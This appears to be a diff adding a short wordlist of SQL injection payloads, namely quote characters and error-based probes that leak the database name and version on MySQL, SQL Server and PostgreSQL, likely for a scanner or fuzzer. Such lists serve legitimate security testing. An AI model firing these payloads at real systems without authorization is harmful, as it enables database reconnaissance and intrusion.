@@ -1,0 +1,5 @@
+'
+"
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST(version() AS INTEGER)--
